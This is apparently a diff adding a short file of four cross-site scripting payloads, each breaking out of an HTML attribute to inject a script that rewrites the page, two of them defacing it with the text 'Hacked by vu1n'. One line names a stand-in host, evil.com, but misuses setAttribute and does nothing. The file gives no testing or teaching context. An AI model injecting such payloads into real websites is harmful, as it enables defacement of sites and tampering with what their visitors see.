@@ -1,0 +1,7 @@
+"><script>document.getElementsByTagName("h2")[0].innerHTML = "Searching";</script>
+
+"><script>document.getElementsByTagName("html")[0].setAttribute="http://evil.com";</script>
+
+"><script>document.documentElement.innerHTML="<html><h1>Hacked by vu1n</h1></html>"</script>
+
+"><script>document.body.innerHTML="<h1>Hacked by vu1n</h1>";</script>
